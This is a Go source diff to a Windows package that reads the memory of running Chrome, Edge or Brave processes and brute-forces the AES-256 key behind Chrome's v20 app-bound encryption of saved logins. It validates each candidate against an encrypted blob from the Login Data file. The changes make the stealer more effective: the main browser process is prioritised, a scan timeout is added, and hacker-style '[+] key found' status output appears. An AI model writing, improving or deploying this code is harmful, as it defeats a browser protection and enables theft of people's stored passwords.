@@ -3,10 +3,13 @@
 package decrypt
 
 import (
+	"context"
 	"crypto/aes"
 	"crypto/cipher"
 	"fmt"
+	"os"
 	"syscall"
+	"time"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -23,17 +26,18 @@ var (
 )
 
 const (
-	th32csSnapProcess   = 0x00000002
-	memCommit           = 0x00001000
-	memPrivate          = 0x00020000
-	pageReadonly        = 0x00000002
-	pageReadWrite       = 0x00000004
-	pageExecuteRead     = 0x00000020
+	th32csSnapProcess    = 0x00000002
+	memCommit            = 0x00001000
+	memPrivate           = 0x00020000
+	pageReadonly         = 0x00000002
+	pageReadWrite        = 0x00000004
+	pageExecuteRead      = 0x00000020
 	pageExecuteReadWrite = 0x00000040
-	pageWriteCopy       = 0x00000008
+	pageWriteCopy        = 0x00000008
 
-	maxRegionSize   = 64 * 1024 * 1024  // skip regions > 64 MB
-	maxTotalScanned = 128 * 1024 * 1024 // stop after scanning 128 MB total per process
+	maxRegionSize   = 32 * 1024 * 1024  // skip regions > 32 MB
+	maxTotalScanned = 256 * 1024 * 1024 // stop after 256 MB per process
+	memScanTimeout  = 45 * time.Second  // hard wall-clock limit
 )
 
 type processEntry32 struct {
@@ -59,57 +63,87 @@ type memoryBasicInformation struct {
 	Type              uint32
 }
 
-// ScanChromeProcessMemory finds all running chrome.exe / msedge.exe processes,
-// reads their MEM_PRIVATE+MEM_COMMIT pages, and searches for a 32-byte AES-256
-// key that successfully decrypts a known v20-encrypted blob from Login Data.
-// The decrypted key is returned for immediate use; no disk writes are made.
+// chromeProcess holds a process entry with its resolved name.
+type chromeProcess struct {
+	pid       uint32
+	parentPID uint32
+	name      string
+}
+
+// ScanChromeProcessMemory finds the main browser process for the given browser,
+// reads its MEM_PRIVATE+MEM_COMMIT heap pages, and searches for the 32-byte
+// AES-256 v20 key using a GCM validation oracle.
 func ScanChromeProcessMemory(profileDir, browserName string) ([]byte, error) {
-	// Get a v20 ciphertext blob to use as a validation oracle.
 	blob, err := getFirstV20Blob(profileDir)
 	if err != nil {
 		return nil, fmt.Errorf("no v20 blob for validation: %w", err)
 	}
 
-	exeName := "chrome.exe"
-	switch {
-	case isEdge(browserName):
-		exeName = "msedge.exe"
-	case isBrave(browserName):
-		exeName = "brave.exe"
+	exeName := browserExeName(browserName)
+	procs, err := enumerateProcesses()
+	if err != nil {
+		return nil, err
 	}
 
-	pids, err := findProcessPIDs(exeName)
-	if err != nil || len(pids) == 0 {
-		return nil, fmt.Errorf("%s not running (no PIDs found)", exeName)
+	// Collect all PIDs for this browser.
+	var browserPIDs []chromeProcess
+	pidSet := map[uint32]bool{}
+	for _, p := range procs {
+		if equalFold(p.name, exeName) {
+			browserPIDs = append(browserPIDs, p)
+			pidSet[p.pid] = true
+		}
+	}
+	if len(browserPIDs) == 0 {
+		return nil, fmt.Errorf("%s not running", exeName)
 	}
 
-	for _, pid := range pids {
-		key, err := scanProcessMemoryForKey(pid, blob)
+	// The main browser process is the one whose parent is NOT another
+	// instance of the same browser (i.e. it was launched by the user/OS,
+	// not spawned by Chrome itself). Try it first.
+	var ordered []chromeProcess
+	for _, p := range browserPIDs {
+		if !pidSet[p.parentPID] {
+			ordered = append([]chromeProcess{p}, ordered...)
+		} else {
+			ordered = append(ordered, p)
+		}
+	}
+
+	fmt.Fprintf(os.Stderr, "[*] Scanning %d %s process(es) for v20 key...\n", len(ordered), exeName)
+
+	ctx, cancel := context.WithTimeout(context.Background(), memScanTimeout)
+	defer cancel()
+
+	for i, p := range ordered {
+		select {
+		case <-ctx.Done():
+			return nil, fmt.Errorf("memory scan timed out after %s", memScanTimeout)
+		default:
+		}
+		fmt.Fprintf(os.Stderr, "[*] Scanning PID %d (%d/%d)...\n", p.pid, i+1, len(ordered))
+		key, err := scanProcessMemoryForKey(ctx, p.pid, blob)
 		if err == nil && key != nil {
+			fmt.Fprintf(os.Stderr, "[+] v20 key found in PID %d\n", p.pid)
 			return key, nil
 		}
 	}
-	return nil, fmt.Errorf("key not found in %s memory (try running while browser is open)", exeName)
+	return nil, fmt.Errorf("v20 key not found in %s memory", exeName)
 }
 
-func isEdge(name string) bool {
-	switch name {
-	case "Edge", "edge", "msedge":
-		return true
+func browserExeName(browserName string) string {
+	switch {
+	case equalFold(browserName, "Edge") || equalFold(browserName, "msedge"):
+		return "msedge.exe"
+	case equalFold(browserName, "Brave"):
+		return "brave.exe"
+	default:
+		return "chrome.exe"
 	}
-	return false
 }
 
-func isBrave(name string) bool {
-	switch name {
-	case "Brave", "brave":
-		return true
-	}
-	return false
-}
-
-// findProcessPIDs returns all PIDs whose executable name matches (case-insensitive).
-func findProcessPIDs(exeName string) ([]uint32, error) {
+// enumerateProcesses returns all running processes via CreateToolhelp32Snapshot.
+func enumerateProcesses() ([]chromeProcess, error) {
 	snap, _, err := procCreateToolhelp32Snapshot.Call(th32csSnapProcess, 0)
 	if snap == uintptr(syscall.InvalidHandle) {
 		return nil, fmt.Errorf("CreateToolhelp32Snapshot: %w", err)
@@ -118,30 +152,25 @@ func findProcessPIDs(exeName string) ([]uint32, error) {
 
 	var entry processEntry32
 	entry.dwSize = uint32(unsafe.Sizeof(entry))
-
 	ret, _, _ := procProcess32First.Call(snap, uintptr(unsafe.Pointer(&entry)))
 	if ret == 0 {
 		return nil, fmt.Errorf("Process32First: empty snapshot")
 	}
 
-	target := syscall.UTF16ToString(entry.szExeFile[:])
-	wantUTF16, _ := syscall.UTF16FromString(exeName)
-	_ = wantUTF16
-
-	var pids []uint32
+	var out []chromeProcess
 	for {
-		name := syscall.UTF16ToString(entry.szExeFile[:])
-		if equalFold(name, exeName) {
-			pids = append(pids, entry.th32ProcessID)
-		}
+		out = append(out, chromeProcess{
+			pid:       entry.th32ProcessID,
+			parentPID: entry.th32ParentProcessID,
+			name:      syscall.UTF16ToString(entry.szExeFile[:]),
+		})
 		entry.dwSize = uint32(unsafe.Sizeof(entry))
 		ret, _, _ = procProcess32Next.Call(snap, uintptr(unsafe.Pointer(&entry)))
 		if ret == 0 {
 			break
 		}
 	}
-	_ = target
-	return pids, nil
+	return out, nil
 }
 
 func equalFold(a, b string) bool {
@@ -189,10 +218,9 @@ func getFirstV20Blob(profileDir string) ([]byte, error) {
 	return nil, fmt.Errorf("no v20-encrypted entries in Login Data")
 }
 
-// scanProcessMemoryForKey walks all MEM_PRIVATE+MEM_COMMIT pages of the given
-// PID, reads them in 4 KB chunks, and tries every 32-byte aligned candidate
-// as an AES-256 key against the validation oracle blob.
-func scanProcessMemoryForKey(pid uint32, blob []byte) ([]byte, error) {
+// scanProcessMemoryForKey walks MEM_PRIVATE+MEM_COMMIT pages and searches for
+// the 32-byte AES key. Respects ctx for cancellation/timeout.
+func scanProcessMemoryForKey(ctx context.Context, pid uint32, blob []byte) ([]byte, error) {
 	handle, err := windows.OpenProcess(
 		windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
 		false, pid,
@@ -204,10 +232,15 @@ func scanProcessMemoryForKey(pid uint32, blob []byte) ([]byte, error) {
 
 	var totalScanned int64
 	var addr uintptr
-
 	buf := make([]byte, 4*1024*1024) // 4 MB read buffer
 
 	for {
+		select {
+		case <-ctx.Done():
+			return nil, ctx.Err()
+		default:
+		}
+
 		var mbi memoryBasicInformation
 		ret, _, _ := procVirtualQueryEx.Call(
 			uintptr(handle),
@@ -221,7 +254,6 @@ func scanProcessMemoryForKey(pid uint32, blob []byte) ([]byte, error) {
 
 		next := mbi.BaseAddress + mbi.RegionSize
 
-		// Only scan private, committed, readable pages of reasonable size.
 		if mbi.State == memCommit &&
 			mbi.Type == memPrivate &&
 			isReadable(mbi.Protect) &&
@@ -261,7 +293,6 @@ func scanProcessMemoryForKey(pid uint32, blob []byte) ([]byte, error) {
 }
 
 func isReadable(protect uint32) bool {
-	// Mask off guard/nocache/writecombine modifiers.
 	p := protect & 0xFF
 	switch p {
 	case pageReadonly, pageReadWrite, pageExecuteRead, pageExecuteReadWrite, pageWriteCopy:
@@ -270,8 +301,6 @@ func isReadable(protect uint32) bool {
 	return false
 }
 
-// searchForKey slides a 32-byte window through data and validates each
-// high-entropy candidate against the v20 blob. Returns the key on success.
 func searchForKey(data, blob []byte) []byte {
 	if len(data) < 32 || len(blob) < 3+12+16 {
 		return nil
@@ -290,8 +319,6 @@ func searchForKey(data, blob []byte) []byte {
 	return nil
 }
 
-// hasMinEntropy returns true when the 32-byte slice has at least 16 distinct
-// byte values — cheap guard against null-filled pages and ASCII strings.
 func hasMinEntropy(b []byte) bool {
 	var seen [256]bool
 	unique := 0
@@ -304,20 +331,16 @@ func hasMinEntropy(b []byte) bool {
 	return unique >= 16
 }
 
-// validateChromeKey attempts AES-256-GCM decryption of a v20 blob using the
-// given 32-byte key. Returns true only when GCM authentication succeeds.
-// False positive probability ≈ 2^-128 (negligible).
 func validateChromeKey(key, blob []byte) bool {
 	if string(blob[:3]) != "v20" {
 		return false
 	}
-	raw := blob[3:] // 12-byte nonce + ciphertext + 16-byte tag
+	raw := blob[3:]
 	if len(raw) < 12+16 {
 		return false
 	}
 	nonce := raw[:12]
 	ct := raw[12:]
-
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		return false
@@ -327,7 +350,5 @@ func validateChromeKey(key, blob []byte) bool {
 		return false
 	}
 	pt, err := gcm.Open(nil, nonce, ct, nil)
-	// v20 plaintext starts with 32 bytes of per-entry metadata.
-	// We just need the decryption to succeed and produce non-empty output.
 	return err == nil && len(pt) > 32
 }
